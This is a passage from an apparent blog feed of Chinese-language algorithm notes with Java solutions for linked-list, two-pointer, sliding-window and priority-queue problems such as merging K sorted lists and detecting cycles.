2：</strong></p><pre><strong>输入：</strong>nums = [[1,2,3],[1,2,3],[1,2,3]]<strong>输出：</strong>[1,1]</pre><p><strong>提示：</strong></p><ul>    <li><code>nums.length == k</code></li>    <li><code>1 &lt;= k &lt;= 3500</code></li>    <li><code>1 &lt;= nums[i].length &lt;= 50</code></li>    <li><code>-10<sup>5</sup> &lt;= nums[i][j] &lt;= 10<sup>5</sup></code></li>    <li><code>nums[i]</code> 按非递减顺序排列</li></ul></div><ol><li><p>思路</p><blockquote><p>要求满足区间，可以用左右双指针去找；求每个列表都有一个数满足在区间内，可以用memo数组存储是否满足，当need满足列表长度时为满足所求，然后算出最小区间即可。</p></blockquote></li><li><p>解题方法</p><blockquote><p>思路在于把列表内的值都转化为hash映射，把列表都转化为index求是否所有的index都在区间内即可。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] smallestRange(List&lt;List&lt;Integer&gt;&gt; nums) &#123;</span><br><span class="line">        <span class="comment">// 整体思路：把列表里面的数都映射进hash表，然后用need数组need[nums.length]判断所求的区间是否都满足了每个列表都有一个数在区间内</span></span><br><span class="line">        Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="comment">// 初始化满足的最小区间，最小值为所有列表里面的值的最小值，最大值为所有列表里面的值的最大值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.MAX_VALUE, maxVal = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> x: nums.get(i)) &#123;</span><br><span class="line">                List&lt;Integer&gt; list = map.getOrDefault(x, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">                list.add(i);</span><br><span class="line">                map.put(x, list);</span><br><span class="line">                minVal = Math.min(minVal, x);</span><br><span class="line">                maxVal = Math.max(maxVal, x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 滑动窗口从最新值开始滑动</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> minVal, right = minVal;</span><br><span class="line">        <span class="comment">// 记录是否列表</span></span><br><span class="line">        <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[size];</span><br><span class="line">        <span class="type">int</span> <span class="variable">need</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bestL</span> <span class="operator">=</span> minVal, bestR = maxVal;</span><br><span class="line">        <span class="keyword">while</span>(right &lt;= maxVal) &#123;</span><br><span class="line">            <span class="comment">// 如果right在map当中</span></span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(right)) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> x: map.get(right)) &#123;</span><br><span class="line">                    <span class="comment">// 记录区间满足了第x个列表</span></span><br><span class="line">                    memo[x]++;</span><br><span class="line">                    <span class="keyword">if</span> (memo[x] == <span class="number">1</span>) need++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 当所有列表都满足了，记录区间大小，并缩小窗口</span></span><br><span class="line">            <span class="keyword">while</span>(need == size) &#123;</span><br><span class="line">                <span class="comment">// 缩小区间</span></span><br><span class="line">                <span class="keyword">if</span>(right - left &lt; bestR - bestL) &#123;</span><br><span class="line">                    bestL = left;</span><br><span class="line">                    bestR = right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(left)) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> x: map.get(left)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (memo[x] == <span class="number">1</span>) need--;</span><br><span class="line">                        memo[x]--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;bestL, bestR&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中间向两端扩散指针"><a href="#中间向两端扩散指针" class="headerlink" title="中间向两端扩散指针"></a>中间向两端扩散指针</h5><p>中间向两端扩散，即左右指针分别朝左右两边扩散，常见为<code>寻找回文子串</code>，判断回文子串的重点为判断子串的长度是奇数还是偶数。</p><p>从给定位置寻找回文子串的算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 s 中寻找以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">String <span class="title function_">palindrome</span><span class="params">(String s, <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="comment">// 防止索引越界</span></span><br><span class="line">    <span class="keyword">while</span> (l &gt;= <span class="number">0</span> &amp;&amp; r &lt; s.length()</span><br><span class="line">            &amp;&amp; s.charAt(l) == s.charAt(r)) &#123;</span><br><span class="line">        <span class="comment">// 双指针，向两边展开</span></span><br><span class="line">        l--; r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回以 s[l] 和 s[r] 为中心的最长回文串</span></span><br><span class="line">    <span class="keyword">return</span> s.substring(l + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后寻找给定字符串的最长回文子串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 以 s[i] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> palindrome(s, i, i);</span><br><span class="line">        <span class="comment">// 以 s[i] 和 s[i+1] 为中心的最长回文子串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> palindrome(s, i, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// res = longest(res, s1, s2)</span></span><br><span class="line">        res = res.length() &gt; s1.length() ? res : s1;</span><br><span class="line">        res = res.length() &gt; s2.length() ? res : s2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 双指针 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 滑动窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表的逻辑相关，寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等</title>
      <link href="/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/"/>
      <url>/2023/10/13/%E9%93%BE%E8%A1%A8%E7%9A%84%E9%80%BB%E8%BE%91%E7%9B%B8%E5%85%B3%EF%BC%8C%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%AC-K-%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%81%E5%AF%BB%E6%89%BE%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%97%B4%E4%BD%8D%E7%BD%AE%E3%80%81%E5%88%A4%E6%96%AD%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF%E3%80%81%E5%88%A4%E6%96%AD%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E7%9B%B8%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<p>本章主要介绍链表相关的逻辑操作，包括寻找倒数第 K 个节点、寻找中间位置、判断是否有环、判断两个链表是否相交等。</p><span id="more"></span><h5 id="寻找倒数第-K-个节点"><a href="#寻找倒数第-K-个节点" class="headerlink" title="寻找倒数第 K 个节点"></a>寻找倒数第 K 个节点</h5><p>链表不同于数组，一开始并不知道长度，可通过找数据规律求解，如链表长度为 <code>n</code>，倒数第 <code>K</code> 个节点转化过来即为顺数第 <code>n-K+1</code> 个节点，可通过先遍历整个链表得出长度 <code>n</code>，再第二次遍历到<code>n-K+1</code>得到寻找节点。</p><p>但是上述需要循环两次遍历。</p><p>我们也可以通过一次遍历来实现（最优解）。运用双指针，指针 <code>p1</code> 从头结点先走 <code>k</code> 步，距离末尾空指针还剩 <code>n-k</code> 步，此时让 <code>p2</code> 指向链表头结点，<code>p1</code> 和 <code>p2</code> 同时走 <code>n-k</code> 步，此时 <code>p2</code> 在链尾 <code>null</code>，<code>p1</code> 正好在顺数第 <code>n-K+1</code> 个节点，即为倒数第 <code>K</code> 个节点，即为所求，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回链表的倒数第 k 个节点</span></span><br><span class="line">ListNode <span class="title function_">findFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 先走 k 步</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p2</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// p1 和 p2 同时走 n - k 步</span></span><br><span class="line">    <span class="keyword">while</span> (p1 != <span class="literal">null</span>) &#123;</span><br><span class="line">        p2 = p2.next;</span><br><span class="line">        p1 = p1.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// p2 现在指向第 n - k + 1 个节点，即倒数第 k 个节点</span></span><br><span class="line">    <span class="keyword">return</span> p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="寻找链表中间位置"><a href="#寻找链表中间位置" class="headerlink" title="寻找链表中间位置"></a>寻找链表中间位置</h5><p>常规做法，我们先遍历整个链表寻找长度 <code>n</code>，然后在遍历 <code>n/2</code>寻找中间位置。</p><p>但是最优解可以通过一次循环来实现。</p><p>运用 <code>快慢指针</code> 的思想，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，<code>slow</code> 则走到了中点位置，即为所求。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">middleNode</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 慢指针指向中点</span></span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断链表是否有环"><a href="#判断链表是否有环" class="headerlink" title="判断链表是否有环"></a>判断链表是否有环</h5><p>思想也为运用 <code>快慢指针</code>，让两个指针 <code>slow</code> <code>fast</code> 同时从头结点出发， <code>slow</code> 走一步,<code>fast</code> 走两步，如果两个指针相遇在同一位置，则证明有环；当 <code>fast</code> 为空或者 <code>fast</code> 的下一节点为空，则证明没有环，算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="comment">// 快慢指针初始化指向 head</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="comment">// 快指针走到末尾时停止</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 慢指针走一步，快指针走两步</span></span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="comment">// 快慢指针相遇，说明含有环</span></span><br><span class="line">        <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不包含环</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="判断两个链表是否相交，并返回相交节点"><a href="#判断两个链表是否相交，并返回相交节点" class="headerlink" title="判断两个链表是否相交，并返回相交节点"></a>判断两个链表是否相交，并返回相交节点</h5><p>此解法我们可以做如下模拟，其中两个链表相交的点为 <code>3</code><br><br>链表1 <code>1,3,5,6,7</code>, <br><br>链表2 <code>2,3,4,8,9</code>, <br>,<br>然后把链表拼接如下 <br><br>链表1 + 链表2 &#x3D; 1,3,5,6,7,2,<code>3</code>,4,8,9 <br><br>链表2 + 链表1 &#x3D; 2,3,4,8,9,1,<code>3</code>,5,6,7</p><p>可以看出两条链表拼接之后，用两个指针分别同时前进，遇到相遇时，该节点即为相交节点。算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="comment">// p1 指向 A 链表头结点，p2 指向 B 链表头结点</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">        <span class="comment">// p1 走一步，如果走到 A 链表末尾，转到 B 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span>            p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2 走一步，如果走到 B 链表末尾，转到 A 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span>            p2 = p2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快慢指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No.23 合并 K 个升序链表</title>
      <link href="/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/10/11/o-23-%E5%90%88%E5%B9%B6-K-%E4%B8%AA%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>困难等级。</p><p>给你一个链表数组，每个链表都已经按升序排列。<br>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：lists = [[1,4,5],[1,3,4],[2,6]]</span><br><span class="line">输出：[1,1,2,3,4,4,5,6]</span><br><span class="line">解释：链表数组如下：</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">将它们合并到一个有序链表中得到。</span><br><span class="line">1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：lists = []</span><br><span class="line">输出：[]</span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：lists = [[]]</span><br><span class="line">输出：[] </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">k == lists.length</span><br><span class="line">0 &lt;= k &lt;= 10^4</span><br><span class="line">0 &lt;= lists[i].length &lt;= 500</span><br><span class="line">-10^4 &lt;= lists[i][j] &lt;= 10^4</span><br><span class="line">lists[i] 按 升序 排列</span><br><span class="line">lists[i].length 的总和不超过 10^4</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol><li>我们想要一个从小到大的升序链表，即每次循环都取出一个最小的节点，然后依次连接，则得到一个升序的链表。</li><li>难点在于如何在 <code>K</code> 个链表中拿到一个最小的节点。</li><li>运用优先队列-小根堆的思想，堆顶得到的永远是最小值。我们可以先遍历所有链表，把每个链表的头结点入堆，即可得到第一个最小的节点（堆顶），然后取出最小节点的下一节点入堆排序，循环取出堆顶，依次连接即可得到一条升序链表。</li></ol><p>技术栈：</p><ol><li>优先队列 <code>PriorityQueue&lt;ListNode&gt; pq = new PriorityQueue&lt;&gt;(length, (a, b) -&gt; (a.val - b.val));</code> , 小根堆就设置 <code>a.val - b.val</code></li><li>加入队列 <code>pq.add(node)</code></li><li>堆顶出列 <code>pq.poll()</code></li><li>判断堆是否为空 <code>pq.isEmpty()</code></li></ol><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p = dummy;</span><br><span class="line">        <span class="comment">// 运用优先队列-小根堆的思想，根节点始终保持最小值</span></span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(lists.length, (a,b) -&gt; (a.val - b.val));</span><br><span class="line">        <span class="comment">// 因为链表数组已经排序，先将链表数组内的头节点全部存入小根堆中</span></span><br><span class="line">        <span class="keyword">for</span>(ListNode head:lists) &#123;</span><br><span class="line">            <span class="comment">// 如果链表非空，则入堆</span></span><br><span class="line">            <span class="keyword">if</span>(head != <span class="literal">null</span>) pq.add(head);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环将链表的节点入堆，然后每次取出堆顶节点，则得到升序链表</span></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 堆顶出列</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">minNode</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            p.next = minNode;</span><br><span class="line">            <span class="comment">// 如果堆顶节点还有后续节点，则入堆排序</span></span><br><span class="line">            <span class="keyword">if</span> (minNode.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(minNode.next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// p 往下走</span></span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 链表 </category>
          
          <category> 堆 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No.86 分割链表</title>
      <link href="/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>中等题目。</p><p>给你一个链表的头节点 <code>head</code> 和一个特定值 <code>x</code> ，请你对链表进行分隔，使得所有 <strong>小于</strong> <code>x</code> 的节点都出现在 <strong>大于或等于</strong> <code>x</code> 的节点之前。</p><p>你应当 <strong>保留</strong> 两个分区中每个节点的初始相对位置。</p><span id="more"></span><p> 示例 1：<br><img src="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,4,3,2,5,2], x = 3</span><br><span class="line">输出：[1,2,2,4,3,5]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：head = [2,1], x = 2</span><br><span class="line">输出：[1,2]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">链表中节点的数目在范围 [0, 200] 内</span><br><span class="line">-100 &lt;= Node.val &lt;= 100</span><br><span class="line">-200 &lt;= x &lt;= 200</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>本题为单链表，关键点为<code>虚拟头节点</code>和<code>断开原链表节点的next指针防止成环</code>。新建两条链表，把小于<code>x</code>的节点放在链表1，大于等于<code>x</code>的放在链表2，然后合并链表。</p><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span 